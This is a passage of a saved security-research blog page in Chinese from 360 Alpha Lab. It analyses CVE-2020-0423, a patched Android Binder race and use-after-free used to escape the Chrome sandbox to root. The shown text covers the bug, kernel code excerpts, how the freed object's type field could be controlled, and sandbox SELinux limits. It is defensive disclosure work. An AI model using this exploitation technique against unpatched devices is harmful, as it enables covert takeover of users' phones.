<!DOCTYPE html>
<!-- saved from url=(0032)https://vul.360.net/archives/217 -->
<html lang="zh-Hans"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
<title>Escape from chrome sandbox to root</title>
<meta name="description" content="在2020年7月，我们向谷歌上报了一条远程ROOT利用链，该利用链首次实现了针对谷歌旗舰机型Pixel 4的一键远程ROOT，从而在用户未察觉的情况下实现对设备的远程控制。截至漏洞公开前，360 Alpha Lab已协助厂商完成了相关漏洞的修复。该漏洞研究成果已被2021年BlackHat USA会议收录，相关资料可以这里找到。该项研究成果也因其广泛的影响力在谷歌2020年官方漏洞奖励计划年报中得到了公开致谢，并斩获“安全界奥斯卡”Pw">
<meta name="keywords" content="内核安全,浏览器安全">
<link rel="apple-touch-icon" href="https://vul.360.net/wp-content/themes/JieStyle-Two/images/icon_32.png">
<link rel="icon" href="https://vul.360.net/wp-content/themes/JieStyle-Two/images/icon_32.png" type="image/x-icon">
<link rel="stylesheet" href="./2021 - Escape from chrome sandbox to root_files/bootstrap.min.css">
<link rel="stylesheet" href="./2021 - Escape from chrome sandbox to root_files/fontawesome.min.css">
<link rel="stylesheet" href="./2021 - Escape from chrome sandbox to root_files/style.css">
<meta name="robots" content="noindex, nofollow">
<link rel="stylesheet" id="wp-block-library-css" href="./2021 - Escape from chrome sandbox to root_files/style.min.css" type="text/css" media="all">
<link rel="stylesheet" id="pure-highlightjs-style-css" href="./2021 - Escape from chrome sandbox to root_files/vs.css" type="text/css" media="all">
<link rel="stylesheet" id="pure-highlightjs-css-css" href="./2021 - Escape from chrome sandbox to root_files/pure-highlight.css" type="text/css" media="all">
<link rel="stylesheet" id="wbui-css-css" href="./2021 - Escape from chrome sandbox to root_files/wbui.css" type="text/css" media="all">
<link rel="stylesheet" id="wbs-dwqr-css-css" href="./2021 - Escape from chrome sandbox to root_files/wbp_donate.css" type="text/css" media="all">
<style type="text/css">
    a{color:#5bc0eb}
    a:hover{color:#2980b9!important}
    #header{background-color:#5bc0eb}
    .widget .widget-title::after{background-color:#5bc0eb}
    .uptop{border-left-color:#5bc0eb}
    #titleBar .toggle:before{background:#5bc0eb}
</style>
</head>

<body><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" overflow="hidden" style="position:absolute;width:0;height:0"><defs><symbol id="wbsico-dwqr-close" viewBox="0 0 18 18"><path fill-rule="evenodd" d="M17.61.39a1.24 1.24 0 00-1.8 0L9 7.2 2.19.39C1.67-.13.9-.13.39.39s-.52 1.28 0 1.8L7.2 9 .39 15.81a1.24 1.24 0 000 1.8c.25.26.51.39.9.39s.64-.13.9-.39L9 10.8l6.81 6.81c.26.26.65.39.9.39s.65-.13.9-.39c.52-.51.52-1.28 0-1.8L10.8 9l6.81-6.81c.52-.52.52-1.29 0-1.8z"></path></symbol><symbol id="wbsico-dwqr-donate" viewBox="0 0 9 18"><path fill-rule="evenodd" d="M5.63 8.1V4.61c.67.23 1.12.9 1.12 1.58S7.2 7.3 7.88 7.3 9 6.86 9 6.2a3.8 3.8 0 00-3.38-3.83V1.12C5.63.45 5.17 0 4.5 0S3.37.45 3.37 1.12v1.24A3.8 3.8 0 000 6.2c0 2.35 1.8 3.25 3.38 3.7v3.49c-.68-.23-1.13-.9-1.13-1.58S1.8 10.7 1.12 10.7 0 11.14 0 11.8a3.8 3.8 0 003.38 3.83v1.24c0 .67.45 1.12 1.12 1.12s1.13-.45 1.13-1.12v-1.24A3.88 3.88 0 009 11.8c0-2.36-1.8-3.26-3.38-3.7zM2.25 6.19c0-.79.45-1.35 1.13-1.58v2.93c-.8-.34-1.13-.68-1.13-1.35zm3.38 7.2v-2.93c.78.34 1.12.68 1.12 1.35 0 .79-.45 1.35-1.13 1.58z"></path></symbol><symbol id="wbsico-dwqr-like" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M13.3 6H9V2c0-1.5-.8-2-2-2-.3 0-.6.2-.6.5L4 8v8h8.6c1.3 0 2.4-1 2.6-2.3l.8-4.6c.1-.8-.1-1.6-.6-2.1-.5-.7-1.3-1-2.1-1M0 8h2v8H0z"></path></symbol><symbol id="wbsico-dwqr-share" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M11 6a3 3 0 10-3-2.4l-3 2A3 3 0 003 5a3 3 0 000 6 3 3 0 001.9-.7l3.2 2-.1.7a3 3 0 103-3 3 3 0 00-1.9.7L6 8.7a3 3 0 000-1.3l3.2-2A3 3 0 0011 6"></path></symbol><symbol id="wbsico-dwqr-qq" viewBox="0 0 32 32"><path fill="var(--color1, #00b6f7)" d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0zm7.09 19.908a11.686 11.686 0 01-1.463 2.655l.023-.032a2.17 2.17 0 011.52 2.029v.002s.06 1.636-3.54 1.523c0 0-2.54-.2-3.3-1.269h-.66c-.76 1.072-3.3 1.269-3.3 1.269-3.6.113-3.54-1.523-3.54-1.523a2.168 2.168 0 011.505-2.027l.015-.004a11.565 11.565 0 01-1.412-2.544l-.028-.079c-2.25 3.639-2.02-.508-2.02-.508a7.824 7.824 0 012.189-4.06l.001-.001c-.25-2.229.68-2.624.68-2.624.19-6.893 6.12-6.773 6.24-6.769s6.05-.124 6.24 6.769c0 0 .93.395.68 2.623a7.796 7.796 0 012.181 4.012l.009.05s.23 4.147-2.02.508z"></path></symbol><symbol id="wbsico-dwqr-weibo" viewBox="0 0 32 32"><path fill="var(--color2, #e45c62)" d="M14.54 15.879c-3.18.146-5.75 1.851-5.75 3.977s2.57 3.718 5.75 3.569 5.76-2.137 5.76-4.26-2.58-3.432-5.76-3.286zm2.17 5.346a3.715 3.715 0 01-4.797.848l.017.009a1.663 1.663 0 01-.86-1.432v-.001a3 3 0 012.823-3.371h.007c3.21-.373 3.78 2.689 2.81 3.946zm-3.67-1.594c-.557.062-.99.516-1.02 1.077v.003a.872.872 0 001.086.773l-.006.001a1.16 1.16 0 001.079-1.02l.001-.005a.923.923 0 00-1.147-.828l.006-.001zm1.52-.413a.48.48 0 00-.139.612l-.001-.003a.372.372 0 00.56.051.492.492 0 00.169-.612l.001.003a.385.385 0 00-.59-.052zM16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0zm7.14 20.574c-1.31 2.786-5.63 4.142-8.84 3.89-3.04-.239-6.96-1.251-7.37-4.937v-.047c0-1.45.534-2.775 1.416-3.789l-.006.007s2.33-3.252 5.04-4.179 3.03.639 3.03 1.562c-.15.784-.42 1.245.6.928 0 0 2.67-1.237 3.77-.14.258.309.415.711.415 1.149 0 .354-.102.685-.279.963l.004-.007s-.36.408.39.554a2.684 2.684 0 011.823 4.058l.007-.011zm-2.63-7.7a.527.527 0 01-.001-1.05h.001a2.362 2.362 0 012.876 2.926l.004-.017v.056a.53.53 0 01-1.05-.083s.52-2.349-1.83-1.83zm5.53 2.81l.001.028a.625.625 0 01-.745.614l.004.001a.7.7 0 01-.76-.684v-.001c.009-.267.064-.518.155-.75l-.005.015a3.38 3.38 0 00-.238-2.551l.009.019a4.027 4.027 0 00-3.796-1.87l.016-.001c-.197.071-.43.129-.67.164l-.02.002a.768.768 0 01-.216-1.499l.005-.001a.502.502 0 01.085-.043l.005-.002a6.58 6.58 0 012.662-.019l-.042-.007c2.02.473 4.8 2.428 3.55 6.59z"></path></symbol><symbol id="wbsico-dwqr-weixin" viewBox="0 0 32 32"><path fill="var(--color3, #68c313)" d="M18.11 15.987a.774.774 0 00-.73.755v.001c.043.374.35.663.729.678h.001a.744.744 0 10-.005-1.433l.005-.001zm-2.4-3.52a.867.867 0 00.941-.864l-.001-.05v.002l.002-.063a.854.854 0 00-.946-.849h.004a.984.984 0 00-1.069.909v.003a1.001 1.001 0 001.073.912h-.003zM16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0zm-3.02 20.054a8.547 8.547 0 01-2.64-.435l.06.017-2.64 1.33.76-2.242c-1.715-1.031-2.865-2.849-2.95-4.941v-.012c0-3.545 3.34-6.256 7.41-6.256 3.59 0 6.8 2.137 7.43 5.161a3.677 3.677 0 00-.707-.078H19.7a6.06 6.06 0 00-6.28 5.856v.01c.005.558.081 1.096.22 1.608l-.01-.044a5.385 5.385 0 01-.545.027l-.11-.001h.005zm10.87 2.554l.52 1.877-1.98-1.121c-.657.192-1.424.331-2.213.389l-.037.002c-3.49 0-6.25-2.4-6.25-5.37s2.76-5.37 6.25-5.37c3.32 0 6.29 2.4 6.29 5.37a5.531 5.531 0 01-2.557 4.21l-.023.013zm-13.3-11.965a1.027 1.027 0 00-1.12.907v.005a1.045 1.045 0 001.124.911h-.004l.04.001a.9.9 0 00.9-.9v-.014.001l.001-.03a.884.884 0 00-.943-.882h.003zm11.65 5.344a.752.752 0 00-.73.752v.005a.739.739 0 00.73.678.74.74 0 10-.005-1.433l.005-.001z"></path></symbol><symbol id="wbsico-dwqr-qzone" viewBox="0 0 18 18"><path fill="var(--color4, #ebbf00)" d="M12.26 7.09H6.01l4.12.7-4.42 3.6h6.7l-3.96-.86 3.81-3.45zM9 0a9 9 0 109 9 9 9 0 00-9-9zm5.85 7.39l-2.28 1.94.75 4.88a.31.31 0 01-.3.15l-3.97-2.44-3.99 2.44c-.3 0-.33 0-.33-.15l.55-4.88-2.42-2.14-.82-.59h-.23v-.02l.23.03h4.73l.62-1.1L8.9 2.3h.3l1.68 3.22.6 1.09h4.12c.16 0 .16-.1.16.06l-.92.72z"></path></symbol><symbol id="wbsico-dwqr-poster" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M14 0a2 2 0 012 2v12a2 2 0 01-2 2H2a2 2 0 01-2-2V2C0 .9.9 0 2 0h12zm0 2H2v12h12V2zm-6 9a1 1 0 110 2 1 1 0 010-2zm5-8v7H3V3h10z"></path></symbol></defs></svg>
	<div id="mobiletop" style="padding-top: 44px;"><img src="./2021 - Escape from chrome sandbox to root_files/mobile-top.png" style="width:100%"></div>
<header id="header">
 &nbsp; &nbsp;<div class="avatar"><img src="./2021 - Escape from chrome sandbox to root_files/pc-logo.png" width="65%"><h1 id="name">360政企安全漏洞研究院</h1></div>
    <div class="nav">
        <ul><li><img src="./2021 - Escape from chrome sandbox to root_files/主页" home=""><a href="https://vul.360.net/" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">主页 Home</a></li>
<li><img src="./2021 - Escape from chrome sandbox to root_files/归档" archive=""><a href="https://vul.360.net/archive" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">归档 Archive</a></li>
<li><img src="./2021 - Escape from chrome sandbox to root_files/成果" achievement=""><a href="https://vul.360.net/achievement" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">成果 Achievement</a></li>
<li><img src="./2021 - Escape from chrome sandbox to root_files/招聘" careers=""><a href="https://vul.360.net/careers" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">招聘 Careers</a></li>
<li><img src="./2021 - Escape from chrome sandbox to root_files/致谢" acknowledge=""><a href="https://vul.360.net/acknowledge" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">致谢 Acknowledge</a></li>
<li><img src="./2021 - Escape from chrome sandbox to root_files/关于" about=""><a href="https://vul.360.net/about" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">关于 About</a></li>
</ul>    </div>
	    <div class="sns">
        <a href="https://vul.360.net/feed" target="_blank" rel="nofollow" data-toggle="tooltip" data-placement="top" title="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" data-original-title="RSS"><i class="fas fa-rss"></i></a>        <a href="https://weibo.com/" target="_blank" rel="nofollow" data-toggle="tooltip" data-placement="top" title="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" data-original-title="Weibo"><i class="fab fa-weibo"></i></a>        <a href="https://twitter.com/" target="_blank" rel="nofollow" data-toggle="tooltip" data-placement="top" title="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" data-original-title="Twitter"><i class="fab fa-twitter"></i></a>        <a href="https://www.facebook.com/" target="_blank" rel="nofollow" data-toggle="tooltip" data-placement="top" title="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" data-original-title="Facebook"><i class="fab fa-facebook"></i></a>        <a href="https://github.com/" target="_blank" rel="nofollow" data-toggle="tooltip" data-placement="top" title="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" data-original-title="GitHub"><i class="fab fa-github-alt"></i></a>    </div>
        <div class="logo2">
<img src="./2021 - Escape from chrome sandbox to root_files/pc-logo2.png" width="65%" style="position:absolute;bottom:20px;left:40px">
    </div>
    </header>
<div id="main">
    <article class="col-md-10 col-md-offset-1 view clearfix">
        <h1 class="view-title">Escape from chrome sandbox to root</h1>
        <div class="view-meta">
            <span>作者: 360 Alpha Lab 韩洪立，简容，王晓东，周鹏</span>
            <span>分类: <a href="https://vul.360.net/archives/category/%e5%ae%89%e5%85%a8%e7%a0%94%e7%a9%b6" rel="category tag">安全研究</a>,<a href="https://vul.360.net/archives/category/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" rel="category tag">漏洞分析</a></span>
            <span>发布时间: 2021-08-25 08:19</span>
            <span></span>
        </div>
        <div class="view-content">

<blockquote class="wp-block-quote"><p>在2020年7月，我们向谷歌上报了一条远程ROOT利用链，该利用链首次实现了针对谷歌旗舰机型Pixel 4的一键远程ROOT，从而在用户未察觉的情况下实现对设备的远程控制。截至漏洞公开前，360 Alpha Lab已协助厂商完成了相关漏洞的修复。该漏洞研究成果已被2021年BlackHat USA会议收录，相关资料可以<a href="https://www.blackhat.com/us-21/briefings/schedule/#typhoon-mangkhut-one-click-remote-universal-root-formed-with-two-vulnerabilities-22946">这里</a>找到。<strong>该项研究成果也因其广泛的影响力在谷歌2020年官方漏洞奖励计划年报中得到了公开致谢，并斩获“安全界奥斯卡”Pwnie Awards的“史诗级成就”和“最佳提权漏洞”两大奖项的提名。这条利用链被我们命名为“飓风山竹”。</strong></p></blockquote>



<p>在上一篇<a href="https://vul.360.net/archives/144">文章</a>中，我们已经介绍了利用链的RCE部分，因此这篇文章将介绍利用链的沙箱提权部分。本文将首先对沙箱提权所使用的Binder驱动漏洞（CVE-2020-0423）进行分析，然后介绍在沙箱环境中提权遇到的挑战及对应的解决方案，最后是我们对这部分内核漏洞利用的总结。</p>



<h1>Introduction</h1>



<p>Binder是安卓系统中最为核心且广泛使用的进程间通信方式，这使得系统设计者需要保证上层应用在各种场景下能够正常调用Binder驱动接口，包括限制最为严格的沙箱环境。近年来，Binder模块先后爆出了多个被证实可以被利用的漏洞，包括我们在2019年发现的“水滴”漏洞（CVE-2019-2025），这个漏洞影响了2016年11月~2019年3月的安卓系统。在此之后，CVE-2019-2215，谷歌Project Zero团队于2019年9月发现该漏洞存在1-day在野利用，影响Pixel 2及以下机型，后于2019年10月安全公告中修补。CVE-2020-0041，由bluefrostsec团队发现，是一枚OOB类型的漏洞，影响了2019年2月~2020年3月的安卓系统，影响的设备包括运行Android 10的Pixel 4及Pixel 3/3a XL。除去这些被证实可被利用的漏洞之外，Binder模块也爆出了一些其他相关的安全问题。按照行业的相关研究结论，大概每1000~1500行代码中间便会存在一枚漏洞，而Binder驱动核心代码binder.c文件中只有不到6000行代码。这不禁让我们有一个疑问，这个模块是否还存在此类漏洞呢？这也是本文将要介绍的CVE-2020-0423，也是利用链中使用的沙箱逃逸提权漏洞。利用该漏洞实现了仅触发一次漏洞就拿到了稳定的任意地址读写元语，可直接从沙箱逃逸提权至ROOT。实现了仅用两枚漏洞就打通了整条利用链，且该利用方案具备通用性。下文将会将其技术实现细节详细的分享给大家，以期能够促进攻防技术的共同进步。</p>



<h1>The Bug</h1>



<p>一个典型的Binder通信过程大致分为四步：（1）Client发送BC_TRANSACTION命令到内核；（2）内核经过处理之后把BC_TRANSACTION转发到Server；（3）Server接收到BC_TRANSACTION后开始处理任务，处理完成之后通过BC_REPLY命令把结果返回到内核；（4）内核经过处理之后把BC_REPLY结果转发给Client。</p>



<p>Binder进程间通信模型:</p>



<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210824181959950-1024x342.png" alt="" class="wp-image-218" width="512" height="171" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210824181959950-1024x342.png 1024w, https://vul.360.net/wp-content/uploads/2021/08/image-20210824181959950-300x100.png 300w, https://vul.360.net/wp-content/uploads/2021/08/image-20210824181959950-768x256.png 768w, https://vul.360.net/wp-content/uploads/2021/08/image-20210824181959950.png 1112w" sizes="(max-width: 512px) 100vw, 512px"></figure></div>



<p>Binder支持多种<a href="https://android.googlesource.com/kernel/msm/+/refs/heads/android-msm-crosshatch-4.9-android10/include/uapi/linux/android/binder.h">类型</a>的对象传递，该漏洞和BINDER_TYPE_BINDER类型的对象传递有关。在如下所示的代码中，首先构造一个flat_binder_object结构体，然后通过BC_TRANSACTION命令发送到内核。</p>



<pre class="wp-block-code"><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">send_service_handle</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> binder_state *bs, uint32_t target, <span class="hljs-keyword">int</span> code, <span class="hljs-keyword">int</span> handle)</span>
</span>{
    <span class="hljs-keyword">struct</span> flat_binder_object binder_obj; 
    <span class="hljs-keyword">uint64_t</span> offsets = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">int</span> obj_size = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> flat_binder_object);
    <span class="hljs-keyword">int</span> offset_size = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">uint64_t</span>);
    <span class="hljs-keyword">int</span> res;

    binder_obj.hdr.type = BINDER_TYPE_BINDER;
    binder_obj.binder = handle;
    binder_obj.cookie = <span class="hljs-number">0xbbbbbbbb</span>;

    res = send_transaction(bs, target, code, &amp;binder_obj, obj_size, &amp;offsets, offset_size);
    <span class="hljs-keyword">return</span> res;
}</code></pre>



<p>一般情况下，当内核接收到BINDER_TYPE_BINDER对象后，会将其<a href="https://android.googlesource.com/kernel/msm/+/refs/heads/android-msm-crosshatch-4.9-android10/drivers/android/binder.c#3439">转换</a>成一个binder_node。在转换的过程中，binder_node结构体中类型为binder_work的成员work将以指针形式插入到当前线程对应的todo链表中。同时内核还会给该binder_node创建对应的binder_ref，这样Server端进程就可以通过该binder_ref找到对应的binder_node。如下图所示，work会被链接到thread-&gt;todo 链表上。</p>



<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210824182114030-1024x337.png" alt="" class="wp-image-219" width="512" height="169" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210824182114030-1024x337.png 1024w, https://vul.360.net/wp-content/uploads/2021/08/image-20210824182114030-300x99.png 300w, https://vul.360.net/wp-content/uploads/2021/08/image-20210824182114030-768x253.png 768w, https://vul.360.net/wp-content/uploads/2021/08/image-20210824182114030.png 1126w" sizes="(max-width: 512px) 100vw, 512px"></figure></div>



<p>那么Server可以用这个binder_ref来做什么呢？当Server在使用完对应的binder_obj之后，会给内核<a href="https://cs.android.com/android/platform/superproject/+/android-10.0.0_r1:frameworks/native/cmds/servicemanager/binder.c;l=287">发送</a>BC_BUFFER_FREE命令。当内核收到该命令后，就会根据该binder_ref找到对应的binder_node，然后减少引用计数器。当计数器变成0时，该binder_node就会被释放掉。</p>



<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210817164215980-1024x341.png" alt="" class="wp-image-220" width="512" height="171" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210817164215980-1024x341.png 1024w, https://vul.360.net/wp-content/uploads/2021/08/image-20210817164215980-300x100.png 300w, https://vul.360.net/wp-content/uploads/2021/08/image-20210817164215980-768x256.png 768w, https://vul.360.net/wp-content/uploads/2021/08/image-20210817164215980-1536x512.png 1536w, https://vul.360.net/wp-content/uploads/2021/08/image-20210817164215980.png 1714w" sizes="(max-width: 512px) 100vw, 512px"></figure></div>



<p>与此同时，Client端也能通过发送BINDER_THREAD_EXIT命令访问到这个binder_work对象。这个命令最终会调用到binder_release_work函数，该函数代码如下所示。在代码[1]处，先从todo链上取出binder_work，这里有锁保护，不存在竞争问题。在代码[2]处，会根据binder_work的type进行相应的清理工作，但是这里没有锁保护。</p>



<pre class="wp-block-code"><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">binder_release_work</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> binder_proc *proc,
                <span class="hljs-keyword">struct</span> list_head *<span class="hljs-built_in">list</span>)</span>
</span>{
    <span class="hljs-keyword">struct</span> binder_work *w;

    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
        w = binder_dequeue_work_head(proc, <span class="hljs-built_in">list</span>);   <span class="hljs-comment">// [1]从链上取出w时有锁保护</span>
        <span class="hljs-keyword">if</span> (!w)
            <span class="hljs-keyword">return</span>;

        <span class="hljs-keyword">switch</span> (w-&gt;type) {                          <span class="hljs-comment">// [2]这里没有锁保护，竞争成功会导致UAF问题</span>
        ...
    }
}</code></pre>



<p>因此，Client和Server之间存在条件竞争问题。这个过程可以分为几步：1、Client发送BINDER_THREAD_EXIT命令，然后从todo链上取出w；2、Server发送BC_BUFFER_FREE命令，内核根据binder_ref找到binder_node，并减少引用计数至0，使得binder_node被释放掉；3、此时binder_work所处内存已经处于释放状态，Client访问w-&gt;type就会导致UAF。</p>



<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210817160010008-1024x332.png" alt="" class="wp-image-221" width="512" height="166" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210817160010008-1024x332.png 1024w, https://vul.360.net/wp-content/uploads/2021/08/image-20210817160010008-300x97.png 300w, https://vul.360.net/wp-content/uploads/2021/08/image-20210817160010008-768x249.png 768w, https://vul.360.net/wp-content/uploads/2021/08/image-20210817160010008-1536x499.png 1536w, https://vul.360.net/wp-content/uploads/2021/08/image-20210817160010008.png 1716w" sizes="(max-width: 512px) 100vw, 512px"></figure></div>



<h1>Exploitation</h1>



<blockquote class="wp-block-quote"><p>前面我们分析了CVE-2020-0423漏洞的原理，接下来我们将给大家介绍如何利用这个漏洞以及这个过程中遇到的一些挑战。</p></blockquote>



<h2>How to exploit the bug?</h2>



<p>经过上面的分析，我们知道这是一个UAF漏洞。这种类型的漏洞利用的关键是Use点，从binder_release_work函数的实现可以看到，这里如果我们可以通过堆喷控制type，switch(w-&gt;type)就会进入我们需要的分支。</p>



<pre class="wp-block-code"><code class="hljs objectivec"><span class="hljs-number">4575</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> binder_release_work(<span class="hljs-keyword">struct</span> binder_proc *proc,
<span class="hljs-number">4576</span>                 <span class="hljs-keyword">struct</span> list_head *list)
<span class="hljs-number">4577</span> {
<span class="hljs-number">4578</span>     <span class="hljs-keyword">struct</span> binder_work *w;
<span class="hljs-number">4579</span>  
<span class="hljs-number">4580</span>     <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
<span class="hljs-number">4581</span>         w = binder_dequeue_work_head(proc, list);
<span class="hljs-number">4582</span>         <span class="hljs-keyword">if</span> (!w)  &lt;---------------------------------------------- [<span class="hljs-number">1</span>]
<span class="hljs-number">4583</span>             <span class="hljs-keyword">return</span>;
<span class="hljs-number">4584</span>  
<span class="hljs-number">4585</span>         <span class="hljs-keyword">switch</span> (w-&gt;type) { &lt;------------------------------------ [<span class="hljs-number">2</span>]
<span class="hljs-number">4586</span>         <span class="hljs-keyword">case</span> BINDER_WORK_TRA<span class="hljs-built_in">NSACTION</span>: {
<span class="hljs-number">4587</span>             <span class="hljs-keyword">struct</span> binder_transaction *t;
<span class="hljs-number">4588</span>  
<span class="hljs-number">4589</span>             t = container_of(w, <span class="hljs-keyword">struct</span> binder_transaction, work);
<span class="hljs-number">4590</span>  
<span class="hljs-number">4591</span>             binder_cleanup_transaction(t, <span class="hljs-string">"process died."</span>,
<span class="hljs-number">4592</span>                            BR_DEAD_REPLY);
<span class="hljs-number">4593</span>         } <span class="hljs-keyword">break</span>;
<span class="hljs-number">4594</span>         <span class="hljs-keyword">case</span> BINDER_WORK_RETURN_ERROR: {
<span class="hljs-number">4595</span>             <span class="hljs-keyword">struct</span> binder_error *e = container_of(
<span class="hljs-number">4596</span>                     w, <span class="hljs-keyword">struct</span> binder_error, work);
<span class="hljs-number">4597</span>  
<span class="hljs-number">4598</span>             binder_debug(BINDER_DEBUG_DEAD_TRA<span class="hljs-built_in">NSACTION</span>,
<span class="hljs-number">4599</span>                 <span class="hljs-string">"undelivered TRANSACTION_ERROR: %u\n"</span>,
<span class="hljs-number">4600</span>                 e-&gt;cmd);
<span class="hljs-number">4601</span>         } <span class="hljs-keyword">break</span>;
<span class="hljs-number">4602</span>         <span class="hljs-keyword">case</span> BINDER_WORK_TRA<span class="hljs-built_in">NSACTION_COMPLETE</span>: {
<span class="hljs-number">4603</span>             binder_debug(BINDER_DEBUG_DEAD_TRA<span class="hljs-built_in">NSACTION</span>,
<span class="hljs-number">4604</span>                 <span class="hljs-string">"undelivered TRANSACTION_COMPLETE\n"</span>);
<span class="hljs-number">4605</span>             kfree(w);
<span class="hljs-number">4606</span>             binder_stats_deleted(BINDER_STAT_TRA<span class="hljs-built_in">NSACTION_COMPLETE</span>);
<span class="hljs-number">4607</span>         } <span class="hljs-keyword">break</span>;
<span class="hljs-number">4608</span>         <span class="hljs-keyword">case</span> BINDER_WORK_DEAD_BINDER_AND_CLEAR:
<span class="hljs-number">4609</span>         <span class="hljs-keyword">case</span> BINDER_WORK_CLEAR_DEATH_NOTIFI<span class="hljs-built_in">CATION</span>: {
<span class="hljs-number">4610</span>             <span class="hljs-keyword">struct</span> binder_ref_death *death;
<span class="hljs-number">4611</span>  
<span class="hljs-number">4612</span>             death = container_of(w, <span class="hljs-keyword">struct</span> binder_ref_death, work);
<span class="hljs-number">4613</span>             binder_debug(BINDER_DEBUG_DEAD_TRA<span class="hljs-built_in">NSACTION</span>,
<span class="hljs-number">4614</span>                 <span class="hljs-string">"undelivered death notification, %016llx\n"</span>,
<span class="hljs-number">4615</span>                 (u64)death-&gt;cookie);
<span class="hljs-number">4616</span>             kfree(death);
<span class="hljs-number">4617</span>             binder_stats_deleted(BINDER_STAT_DEATH);
<span class="hljs-number">4618</span>         } <span class="hljs-keyword">break</span>;
<span class="hljs-number">4619</span>         <span class="hljs-keyword">default</span>:
<span class="hljs-number">4620</span>             pr_err(<span class="hljs-string">"unexpected work type, %d, not freed\n"</span>,
<span class="hljs-number">4621</span>                    w-&gt;type);
<span class="hljs-number">4622</span>             <span class="hljs-keyword">break</span>;
<span class="hljs-number">4623</span>         }
<span class="hljs-number">4624</span>     }
<span class="hljs-number">4626</span> }</code></pre>



<p>首先，我们假定binder_node对应的地址是<strong>X</strong>。根据上面的代码，不同的type值可能导致不同的结果：</p>



<p>（1）type是BINDER_WORK_TRANSACTION，可能触发double-free问题，但需要满足较为苛刻的条件，较难控制；</p>



<p>（2）type是BINDER_WORK_RETURN_ERROR，没有实际影响；</p>



<p>（3）type是BINDER_WORK_TRANSACTION_COMPLETE、BINDER_WORK_DEAD_BINDER_AND_CLEAR和BINDER_WORK_CLEAR_DEATH_NOTIFICATION之一，导致<strong>X+8</strong>被释放；</p>



<p>（4）剩下的情况将直接进入default分支。</p>



<p>综合来看场景（3）流程较为简单，具备较好的可利用性。</p>



<h2><strong>Vision of kernel from sandbox process</strong></h2>



<p>由于Binder模块的特点，通过它可以搭建一条从沙箱进程通往内核的桥梁，但在这条通道上仍有着各种各样的安全策略来保证系统安全稳定的运行。正常情况下我们只能完成一些被规则允许的事情，而我们发现的这枚漏洞便有可能成为这规则之外的”力量”。我们需要避开这一系列的检查，与这一“力量”完成一系列的协作、布局，逐步完成对关键元素控制，并最后一举拿下内核的控制权。但想要完成这一切并不容易，在高度沙箱化的进程中实现逃逸一直以来都是极具挑战性的目标，无论是在各类国际赛事中，还是从安卓历史上来看，在Pixel系列机型上能够实现沙箱逃逸都能称得上是高难度目标，而能够直接提权至ROOT权限的案例就更是罕见。这主要是由于沙箱进程中一系列限制导致的：</p>



<p><strong>极少的攻击面</strong></p>



<p>在安卓中只有极少的几个服务还可以与沙箱中进程通信，我们可以看一下在Android 10上isolated_app域selinux的规则：</p>



<pre class="wp-block-code"><code class="hljs dts">system<span class="hljs-meta-keyword">/sepolicy/</span>private/isolated_app.te
<span class="hljs-meta"># b/17487348</span>
<span class="hljs-meta"># Isolated apps can only access three services,</span>
<span class="hljs-meta"># activity_service, display_service, webviewupdate_service, and</span>
<span class="hljs-meta"># ashmem_device_service.</span>
neverallow <span class="hljs-class">isolated_app </span>{
    service_manager_type
    -activity_service
    -ashmem_device_service
    -display_service
    -webviewupdate_service
}:service_manager find;</code></pre>



<p>而到了Android 11上，ashmem_device_service被从中移出，沙箱中进程无法再直接通过请求ashmem_device_service来创建一片ashmem。</p>



<p>在这为数不多的几个可访问的Binder服务中，其中的大部分接口调用还会有进一步的强制检查来进行封堵。以activity_service为例，在从servicemanager获取Binder代理后，通过该代理大部分接口都会调用enforceNotIsolatedCaller()来检查是否为isolated app，对于isolated_app域的进程会直接抛出安全检查异常。</p>



<pre class="wp-block-code"><code class="hljs java">frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java
